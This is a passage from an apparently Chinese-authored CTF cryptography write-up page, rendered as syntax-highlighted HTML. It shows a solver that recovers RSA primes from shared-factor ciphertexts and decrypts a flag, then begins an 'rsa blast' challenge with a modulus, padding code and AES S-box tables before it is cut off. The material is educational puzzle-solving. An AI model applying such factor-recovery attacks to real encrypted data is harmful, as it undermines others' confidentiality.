class="token punctuation">,</span><span class="token number">65537</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'pri'</span><span class="token punctuation">,</span>pri<span class="token punctuation">)</span><span class="token keyword">for</span> k <span class="token keyword">in</span> combinations<span class="token punctuation">(</span>pri<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    n <span class="token operator">=</span> k<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> k<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">print</span> k<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>str<span class="token punctuation">(</span>pow<span class="token punctuation">(</span>msg<span class="token punctuation">,</span> e<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>solve.py</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#! usr/bin/python2.7</span><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">import</span> binascii<span class="token keyword">import</span> gmpy2<span class="token keyword">def</span> <span class="token function">gcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> a <span class="token operator">&lt;</span> b<span class="token punctuation">:</span>        a<span class="token punctuation">,</span> b <span class="token operator">=</span> b<span class="token punctuation">,</span> a    <span class="token keyword">while</span> b <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>        temp <span class="token operator">=</span> a <span class="token operator">%</span> b        a <span class="token operator">=</span> b        b <span class="token operator">=</span> temp    <span class="token keyword">return</span> a<span class="token keyword">def</span> <span class="token function">egcd</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> a <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>b<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        g<span class="token punctuation">,</span> y<span class="token punctuation">,</span> x <span class="token operator">=</span> egcd<span class="token punctuation">(</span>b <span class="token operator">%</span> a<span class="token punctuation">,</span> a<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span>g<span class="token punctuation">,</span> x <span class="token operator">-</span> <span class="token punctuation">(</span>b <span class="token operator">//</span> a<span class="token punctuation">)</span> <span class="token operator">*</span> y<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">modinv</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> m<span class="token punctuation">)</span><span class="token punctuation">:</span>    g<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y <span class="token operator">=</span> egcd<span class="token punctuation">(</span>a<span class="token punctuation">,</span> m<span class="token punctuation">)</span>    <span class="token keyword">if</span> g <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'modular inverse does not exist'</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> x <span class="token operator">%</span> mc2 <span class="token operator">=</span> <span class="token number">1246234818568605038771725387770032809896657624658751197487822667705150496788266236821445252745402061440344837126297118817722352360943422714353348519968257483217425318287123603122559539044278216514618542935008251728016376351207287908907419066172027356649934716661853550169371283110451199593919378518682893908073257597996213276417788967527409800490507319098619694553882580772197585922179030322385772341029003564359719244782484762058530989277184051441547024568631595655539528137422918541855814336215841836541683256179952847812650782272979437883178787135567291812430132598562391722110607279005808604132547633446702754242</span>c1 <span class="token operator">=</span> <span class="token number">13455981172983326464102311937762831661788310626361076786164994487793945326981111197066703467784063584677545316464486222690177319997065759168374653040496712059568682406584202721616582863702654975066950060466986422582257001703187853927809075825528343329091775200012208860563692058684819775698290978617780577594014210672865880497874392738697086445744342656347507587613428993075257255547029724259635931665971785614738909042286207279739603543188892504358133043289264464915763121424437513688474543252743250750837754962444189265768058493217120380229238478428390747580847275659398491959011425398794606200760449574140326761335</span>c3 <span class="token operator">=</span> <span class="token number">4888187708328317620094507614800274226981107085929590254185425273559042976171503907943793194842845890835133406885671925681517347731439124039971268535772441389943526257018243714512592593512323296725941627631582840937936230289732464068819395084847503736153991018426601148001171410680610396315398455868476519242523364370643315263903656899707643857165005292144961418736390628879183534554050946402008748537061851428674751948379857099827888766867529291843558247067650218013841320566949128247840292451599528568785840031947044173916230774125850838571273228740235067857273673072775479606479505558411747622879981674961795496398</span>c4 <span class="token operator">=</span> <span class="token number">5945807707085423616106397090464145288661224101014907693104654596081518092031824289580553655597136400293583390581989219838293858796303129177903562794487009660324129992480484791256849653177916440709763357317237732026978876936371843211238777064330897077782446698577278202922221650609784909136488983753316374328060041688862833502261386605214386656750469198595184961624056503168436674528338454488445689162595307651649338939926811181397583426347049799471037024928424365956074689363634987714880064366326557578148205795406310315807810873199906864220949509516643869325208494504730147145059516579980994124490343208766447536810</span>c5 <span class="token operator">=</span> <span class="token number">6187445948828077692015970911804646938282242052772994916845077569070730070453969382819385152870562813549652542234501650247554999118997287612656768657169917874500360552882579507148077964788035519927189184337650311696041346297615679489279371787315665879866086591715868260088943256008041145891355773432381271043597673424658569516927545882320343535771872720945022165744462740208023473214182506701311573606230422976998106293803156552098142853857635121713770388765373265153557740921629496699557717987765469270646934300913295007513219413849883613183601728166411181113787689840581266359785250985019212532583960800460788015491</span>c6 <span class="token operator">=</span> <span class="token number">5212091418073782411520553214182135709421767268933861097557470068670598830761237108296366132955527825989098372862689616150847719971020880914262684813844505249039731390296288313064277036616294317850242554242344468349017823603991546642546139312359635120516022621977198868713265236780584328968456455227210401242292651898111573896055644196069499504205254423973191477361052269017513569237003435455766967610384127786317357129201800175882818678442257638418605140567086462026872695510406713566416179338847089594383139719544078973639147656333759205784973323451162915648440751084782358602950098354039646328692181357908591122714</span>c7 <span class="token operator">=</span> <span class="token number">3655638351649160392053613377223998746456935081525685917833104279800461813163792301601632928836306436302774882558931553763046873854372645433876037722220899647761264466458772539363592772806366025160060082392022496959043608616479633871824843539139765269866557324139669669180299880464960812373747543711884223811204173243558307161330834607275612285093379360358536623915157494256701984991891771698584900549732277659667805289723868414345078895913383480318010760628083474820289670382156241646315278789987701943251698483519785588242374214684684812447667402223553085547756490931266818022366894997520489636576763520143455761239</span>c8 <span class="token operator">=</span> <span class="token number">22473849661397275053996298243554884261414191820929237708168650853330395912319504073426952208513086627198829384154042315234052506082911684608144173835091410795393615116386997884885069683405033389454289189585622646957977150864405507253019700368456175153569120706431504842630017193823414614613515543944012768438615372135192092455771020625920899643657460748140525123446385745452885018242994907719060418829076821951353655094288932417789785658686354925401717179930381179237133075628900875416109603229568575866141143927588631408100548721530988132959911381450682687082674104687988294384311340599275049224252503713916928373410</span>c9 <span class="token operator">=</span> <span class="token number">1873513506226622659558980965960349556051601818636390593699111238742079235436048735742501009666517921834732172263333584189891447981830661750295791445758897570358691214228971207469306988655891013882209331385427955502522192570359268476079812111160032458293920218131883616683323041237563743943563895577660520218905767619038915659113775800791354119111094458073436219216055603238833113774387249183198627105364934918297190119325269494891789384314242315970885073496066247057106399028140269736234473860608631980241965505615924442715413658175017031374265609800935996459163053296259788980765102199701839555511572730799034774424</span>c10<span class="token operator">=</span> <span class="token number">20415066745705913332960559851272168836161858864856687615100156867932858500059203383582659999680270947712850092591947365553338831150848535525568756863490320019679102804007709747313186252161566229585999657772047185972884107522202907260488147758131548047735509416576778951156037782507571965765760567109821746219259712533369530160331404056822935924868818144471996283443950605787104623265573763097577017088633658357190202370173046308936352735690024216178434559387107878752418634566838258964132836294305792991271935081972613859675575909742688564959474926073661839487937083301362266785004789397144843903897244356681794196480</span>p <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span><span class="token punctuation">(</span>c1<span class="token operator">-</span>c2<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span>c3<span class="token operator">-</span>c2<span class="token punctuation">)</span><span class="token punctuation">)</span>q <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>gcd<span class="token punctuation">(</span><span class="token punctuation">(</span>c6<span class="token operator">-</span>c9<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span>c7<span class="token operator">-</span>c9<span class="token punctuation">)</span><span class="token punctuation">)</span>c <span class="token operator">=</span> c1n <span class="token operator">=</span> p<span class="token operator">*</span>qd <span class="token operator">=</span> modinv<span class="token punctuation">(</span><span class="token number">65537</span><span class="token punctuation">,</span><span class="token punctuation">(</span>p<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>m <span class="token operator">=</span> hex<span class="token punctuation">(</span>pow<span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> m<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>binascii<span class="token punctuation">.</span>unhexlify<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="10-rsa-blast"><a href="#10-rsa-blast" class="headerlink" title="10.rsa blast"></a>10.rsa blast</h1><p>generally with other encryption algorithm,and can blast by bits.<br>question.py</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># import signal</span>n <span class="token operator">=</span> <span class="token number">0xBACA954B2835186EEE1DAC2EF38D7E11582127FB9E6107CCAFE854AE311C07ACDE3AAC8F0226E1435D53F03DC9CE6701CF9407C77CA9EE8B5C0DEE300B11DD4D6DC33AC50CA9628A7FB3928943F90738BF6F5EC39F786D1E6AD565EB6E0F1F92ED3227658FDC7C3AE0D4017941E1D5B27DB0F12AE1B54664FD820736235DA626F0D6F97859E5969902088538CF70A0E8B833CE1896AE91FB62852422B8C29941903A6CF4A70DF2ACA1D5161E01CECFE3AD80041B2EE0ACEAA69C793D6DCCC408519A8C718148CF897ACB24FADD8485588B50F39BCC0BBF2BF7AD56A51CB3963F1EB83D2159E715C773A1CB5ACC05B95D2253EEFC3CCC1083A5EF279AF06BB92F</span>e <span class="token operator">=</span> <span class="token number">0x10001</span><span class="token keyword">def</span> <span class="token function">pad</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">+=</span> <span class="token punctuation">(</span><span class="token number">256</span> <span class="token operator">-</span> len<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> chr<span class="token punctuation">(</span><span class="token number">256</span> <span class="token operator">-</span> len<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span>    ret <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'\x00'</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> index<span class="token punctuation">,</span> pos <span class="token keyword">in</span> enumerate<span class="token punctuation">(</span>s_box<span class="token punctuation">)</span><span class="token punctuation">:</span>        ret<span class="token punctuation">[</span>pos<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span>    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">unpad</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    ret <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'\x00'</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> index<span class="token punctuation">,</span> pos <span class="token keyword">in</span> enumerate<span class="token punctuation">(</span>invs_box<span class="token punctuation">)</span><span class="token punctuation">:</span>        ret<span class="token punctuation">[</span>pos<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span>    <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>ret<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token operator">-</span>ord<span class="token punctuation">(</span>ret<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">str2int</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> int<span class="token punctuation">(</span>s<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>s_box <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0x77</span><span class="token punctuation">,</span> <span class="token number">0x7B</span><span class="token punctuation">,</span> <span class="token number">0xF2</span><span class="token punctuation">,</span> <span class="token number">0x6B</span><span class="token punctuation">,</span> <span class="token number">0x6F</span><span class="token punctuation">,</span> <span class="token number">0xC5</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0x2B</span><span class="token punctuation">,</span> <span class="token number">0xFE</span><span class="token punctuation">,</span> <span class="token number">0xD7</span><span class="token punctuation">,</span> <span class="token number">0xAB</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span>    <span class="token number">0xCA</span><span class="token punctuation">,</span> <span class="token number">0x82</span><span class="token punctuation">,</span> <span class="token number">0xC9</span><span class="token punctuation">,</span> <span class="token number">0x7D</span><span class="token punctuation">,</span> <span class="token number">0xFA</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x47</span><span class="token punctuation">,</span> <span class="token number">0xF0</span><span class="token punctuation">,</span> <span class="token number">0xAD</span><span class="token punctuation">,</span> <span class="token number">0xD4</span><span class="token punctuation">,</span> <span class="token number">0xA2</span><span class="token punctuation">,</span> <span class="token number">0xAF</span><span class="token punctuation">,</span> <span class="token number">0x9C</span><span class="token punctuation">,</span> <span class="token number">0xA4</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0xC0</span><span class="token punctuation">,</span>    <span class="token number">0xB7</span><span class="token punctuation">,</span> <span class="token number">0xFD</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x3F</span><span class="token punctuation">,</span> <span class="token number">0xF7</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0xA5</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span> <span class="token number">0xF1</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0xD8</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">,</span>    <span class="token number">0x04</span><span class="token punctuation">,</span> <span class="token number">0xC7</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span> <span class="token number">0xC3</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0x96</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x9A</span><span class="token punctuation">,</span> <span class="token number">0x07</span><span class="token punctuation">,</span> <span class="token number">0x12</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0xE2</span><span class="token punctuation">,</span> <span class="token number">0xEB</span><span class="token punctuation">,</span> <span class="token number">0x27</span><span class="token punctuation">,</span> <span class="token number">0xB2</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span>    <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0x83</span><span class="token punctuation">,</span> <span class="token number">0x2C</span><span class="token punctuation">,</span> <span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0x1B</span><span class="token punctuation">,</span> <span class="token number">0x6E</span><span class="token punctuation">,</span> <span class="token number">0x5A</span><span class="token punctuation">,</span> <span class="token number">0xA0</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0xD6</span><span class="token punctuation">,</span> <span class="token number">0xB3</span><span class="token punctuation">,</span> <span class="token number">0x29</span><span class="token punctuation">,</span> <span class="token number">0xE3</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0x84</span><span class="token punctuation">,</span>    <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0xD1</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0xED</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token number">0xFC</span><span class="token punctuation">,</span> <span class="token number">0xB1</span><span class="token punctuation">,</span> <span class="token number">0x5B</span><span class="token punctuation">,</span> <span class="token number">0x6A</span><span class="token punctuation">,</span> <span class="token number">0xCB</span><span class="token punctuation">,</span> <span class="token number">0xBE</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">,</span> <span class="token number">0x4A</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0xCF</span><span class="token punctuation">,</span>    <span class="token number">0xD0</span><span class="token punctuation">,</span> <span class="token number">0xEF</span><span class="token punctuation">,</span> <span class="token number">0xAA</span><span class="token punctuation">,</span> <span class="token number">0xFB</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x4D</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x85</span><span class="token punctuation">,</span> <span class="token number">0x45</span><span class="token punctuation">,</span> <span class="token number">0xF9</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x7F</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0x9F</span><span class="token punctuation">,</span> <span class="token number">0xA8</span><span class="token punctuation">,</span>    <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0xA3</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0x8F</span><span class="token punctuation">,</span> <span class="token number">0x92</span><span class="token punctuation">,</span> <span class="token number">0x9D</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0xF5</span><span class="token punctuation">,</span> <span class="token number">0xBC</span><span class="token punctuation">,</span> <span class="token number">0xB6</span><span class="token punctuation">,</span> <span class="token number">0xDA</span><span class="token punctuation">,</span> <span class="token number">0x21</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0xF3</span><span class="token punctuation">,</span> <span class="token number">0xD2</span><span class="token punctuation">,</span>    <span class="token number">0xCD</span><span class="token punctuation">,</span> <span class="token number">0x0C</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">,</span> <span class="token number">0xEC</span><span class="token punctuation">,</span> <span class="token number">0x5F</span><span class="token punctuation">,</span> <span class="token number">0x97</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x17</span><span class="token punctuation">,</span> <span class="token number">0xC4</span><span class="token punctuation">,</span> <span class="token number">0xA7</span><span class="token punctuation">,</span> <span class="token number">0x7E</span><span class="token punctuation">,</span> <span class="token number">0x3D</span><span class="token punctuation">,</span> <span class="token number">0x64</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0x19</span><span class="token punctuation">,</span> <span class="token number">0x73</span><span class="token punctuation">,</span>    <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x81</span><span class="token punctuation">,</span> <span class="token number">0x4F</span><span class="token punctuation">,</span> <span class="token number">0xDC</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x2A</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0x46</span><span class="token punctuation">,</span> <span class="token number">0xEE</span><span class="token punctuation">,</span> <span class="token number">0xB8</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">,</span> <span class="token number">0xDE</span><span class="token punctuation">,</span> <span class="token number">0x5E</span><span class="token punctuation">,</span> <span class="token number">0x0B</span><span class="token punctuation">,</span> <span class="token number">0xDB</span><span class="token punctuation">,</span>    <span class="token number">0xE0</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0x0A</span><span class="token punctuation">,</span> <span class="token number">0x49</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0x24</span><span class="token punctuation">,</span> <span class="token number">0x5C</span><span class="token punctuation">,</span> <span class="token number">0xC2</span><span class="token punctuation">,</span> <span class="token number">0xD3</span><span class="token punctuation">,</span> <span class="token number">0xAC</span><span class="token punctuation">,</span> <span class="token number">0x62</span><span class="token punctuation">,</span> <span class="token number">0x91</span><span class="token punctuation">,</span> <span class="token number">0x95</span><span class="token punctuation">,</span> <span class="token number">0xE4</span><span class="token punctuation">,</span> <span class="token number">0x79</span><span class="token punctuation">,</span>    <span class="token number">0xE7</span><span class="token punctuation">,</span> <span class="token number">0xC8</span><span class="token punctuation">,</span> <span class="token number">0x37</span><span class="token punctuation">,</span> <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x8D</span><span class="token punctuation">,</span> <span class="token number">0xD5</span><span class="token punctuation">,</span> <span class="token number">0x4E</span><span class="token punctuation">,</span> <span class="token number">0xA9</span><span class="token punctuation">,</span> <span class="token number">0x6C</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0xF4</span><span class="token punctuation">,</span> <span class="token number">0xEA</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x7A</span><span class="token punctuation">,</span> <span class="token number">0xAE</span><span class="token punctuation">,</span> <span class="token number">0x08</span><span class="token punctuation">,</span>    <span class="token number">0xBA</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token number">0x25</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span> <span class="token number">0xA6</span><span class="token punctuation">,</span> <span class="token number">0xB4</span><span class="token punctuation">,</span> <span class="token number">0xC6</span><span class="token punctuation">,</span> <span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0xDD</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x1F</span><span class="token punctuation">,</span> <span class="token number">0x4B</span><span class="token punctuation">,</span> <span class="token number">0xBD</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0x8A</span><span class="token punctuation">,</span>    <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">0x3E</span><span class="token punctuation">,</span> <span class="token number">0xB5</span><span class="token punctuation">,</span> <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0x03</span><span class="token punctuation">,</span> <span class="token number">0xF6</span><span class="token punctuation">,</span> <span class="token number">0x0E</span><span class="token punctuation">,</span> <span class="token number">0x61</span><span class="token punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0xB9</span><span class="token punctuation">,</span> <span class="token number">0x86</span><span class="token punctuation">,</span> <span class="token number">0xC1</span><span class="token punctuation">,</span> <span class="token number">0x1D</span><span class="token punctuation">,</span> <span class="token number">0x9E</span><span class="token punctuation">,</span>    <span class="token number">0xE1</span><span class="token punctuation">,</span> <span class="token number">0xF8</span><span class="token punctuation">,</span> <span class="token number">0x98</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0xD9</span><span class="token punctuation">,</span> <span class="token number">0x8E</span><span class="token punctuation">,</span> <span class="token number">0x94</span><span class="token punctuation">,</span> <span class="token number">0x9B</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x87</span><span class="token punctuation">,</span> <span class="token number">0xE9</span><span class="token punctuation">,</span> <span class="token number">0xCE</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">,</span> <span class="token number">0xDF</span><span class="token punctuation">,</span>    <span class="token number">0x8C</span><span class="token punctuation">,</span> <span class="token number">0xA1</span><span class="token punctuation">,</span> <span class="token number">0x89</span><span class="token punctuation">,</span> <span class="token number">0x0D</span><span class="token punctuation">,</span> <span class="token number">0xBF</span><span class="token punctuation">,</span> <span class="token number">0xE6</span><span class="token punctuation">,</span> <span class="token number">0x42</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x99</span><span class="token punctuation">,</span> <span class="token number">0x2D</span><span class="token punctuation">,</span> <span class="token number">0x0F</span><span class="token punctuation">,</span> <span class="token number">0xB0</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0xBB</span><span class="token punctuation">,</span> <span class="token number">0x16</span><span class="token punctuation">]</span>invs_box <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0x6A</span><span class="token punctuation">,</span> <span class="token number">0xD5</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0xA5</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0xBF</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">,</span> <span class="token number">0xA3</span><span class="token punctuation">,</span> <span class="token number">0x9E</span><span class="token punctuation">,</span> <span class="token number">0x81</span><span class="token punctuation">,</span> <span class="token number">0xF3</span><span class="token punctuation">,</span> <span class="token number">0xD7</span><span class="token punctuation">,</span> <span class="token number">0xFB</span><span class="token punctuation">,</span>    <span class="token number">0x7C</span><span class="token punctuation">,</span> <span class="token number">0xE3</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">,</span> <span class="token number">0x82</span><span class="token punctuation">,</span> <span class="token number">0x9B</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0x87</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x8E</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0xC4</span><span class="token punctuation">,</span> <span class="token number">0xDE</span><span class="token punctuation">,</span> <span class="token number">0xE9</span><span class="token punctuation">,</span> <span class="token number">0xCB</span><span class="token punctuation">,</span>    <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x7B</span><span class="token punctuation">,</span> <span class="token number">0x94</span><span class="token punctuation">,</span> <span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0xA6</span><span class="token 